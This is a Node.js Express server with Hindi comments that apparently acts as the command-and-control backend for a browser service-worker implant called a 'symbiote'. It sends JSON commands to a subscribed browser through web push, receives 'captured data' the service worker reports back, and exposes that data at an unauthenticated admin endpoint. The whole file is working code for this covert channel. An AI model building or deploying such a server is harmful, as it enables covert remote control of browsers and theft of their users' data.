// =================================================================
// 1. आवश्यक पैकेज (Dependencies) को इम्पोर्ट करें
// =================================================================
const express = require('express');
const webpush = require('web-push');
const bodyParser = require('body-parser');
const path = require('path');

// =================================================================
// 2. सर्वर और Middleware को सेटअप करें
// =================================================================
const app = express();

// बॉडी-पार्सर का उपयोग करें ताकि हम JSON डेटा को पढ़ सकें
app.use(bodyParser.json());

// 'public' फोल्डर को स्टेटिक फाइलों (HTML, CSS, JS) के लिए सर्व करें
app.use(express.static(path.join(__dirname, 'public')));

// =================================================================
// 3. VAPID कुंजियाँ (Environment Variables से)
// =================================================================
// ये कुंजियाँ Render के एनवायरनमेंट वेरिएबल्स में सेट की जाएंगी.
// यह आपके कोड को सुरक्षित रखता है.
const publicVapidKey = process.env.PUBLIC_VAPID_KEY;
const privateVapidKey = process.env.PRIVATE_VAPID_KEY;

// जांचें कि क्या कुंजियाँ मौजूद हैं, वर्ना सर्वर क्रैश हो जाएगा और बताएगा.
if (!publicVapidKey || !privateVapidKey) {
    console.error("VAPID keys are not defined! Please set them in your environment variables.");
    process.exit(1);
}

// Web-push को VAPID विवरण सेट करें
webpush.setVapidDetails('mailto:your-email@example.com', publicVapidKey, privateVapidKey);

// =================================================================
// 4. डेटा स्टोरेज (सरल संस्करण)
// =================================================================
// अभी के लिए, हम सब्सक्रिप्शन को एक वेरिएबल में स्टोर करेंगे.
// महत्वपूर्ण: अगर सर्वर रीस्टार्ट होता है, तो यह डेटा खो जाएगा.
// असली प्रोजेक्ट में आप इसे एक डेटाबेस में स्टोर करेंगे.
let userSubscription = null;
let reportedData = []; // सर्विस वर्कर से आने वाले डेटा को स्टोर करने के लिए ऐरे

// =================================================================
// 5. API रूट्स (Endpoints)
// =================================================================

// ---- रूट 1: सब्सक्रिप्शन को सहेजना ----
// जब यूजर नोटिफिकेशन की अनुमति देता है, तो उसका ब्राउज़र यहाँ POST रिक्वेस्ट भेजता है.
app.post('/subscribe', (req, res) => {
    const subscription = req.body;
    userSubscription = subscription; // सब्सक्रिप्शन को सहेजें

    console.log("User subscribed:", subscription);

    // 201 Created का स्टेटस भेजें, जिसका मतलब है कि कुछ सफलतापूर्वक बनाया गया.
    res.status(201).json({ status: 'success' });
});

// ---- रूट 2: एडमिन से कमांड भेजना ----
// आपका एडमिन पैनल इस एंडपॉइंट पर कमांड भेजेगा.
app.post('/send-command', (req, res) => {
    const commandPayload = JSON.stringify(req.body); // कमांड को JSON स्ट्रिंग में बदलें

    if (!userSubscription) {
        return res.status(400).json({ status: 'error', message: 'User is not subscribed.' });
    }

    console.log("Sending command:", commandPayload);

    // Web-push का उपयोग करके नोटिफिकेशन (कमांड) भेजें
    webpush.sendNotification(userSubscription, commandPayload)
        .then(() => {
            res.status(200).json({ status: 'success', message: 'Command sent successfully.' });
        })
        .catch(err => {
            console.error("Error sending notification:", err);
            res.status(500).json({ status: 'error', message: 'Failed to send command.' });
        });
});

// ---- रूट 3: सर्विस वर्कर से डेटा प्राप्त करना ----
// आपका sw.js (सिम्बायोट) इस एंडपॉइंट पर कैप्चर किया गया डेटा भेजेगा.
app.post('/report-data', (req, res) => {
    const data = req.body;
    data.timestamp = new Date().toISOString(); // डेटा के साथ टाइमस्टैम्प जोड़ें
    reportedData.push(data);

    console.log("Received data from symbiote:", data);

    // डेटा मिलने की पुष्टि करें
    res.status(200).json({ status: 'success' });
});

// ---- रूट 4: एडमिन को डेटा दिखाना ----
// आपका एडमिन पैनल इस एंडपॉइंट से सारा रिपोर्ट किया गया डेटा प्राप्त करेगा.
app.get('/get-reported-data', (req, res) => {
    res.status(200).json(reportedData);
});


// =================================================================
// 6. सर्वर को शुरू करना
// =================================================================
const PORT = process.env.PORT || 3000; // Render पोर्ट प्रदान करेगा
app.listen(PORT, () => {
    console.log(`Server started on port ${PORT}`);
});
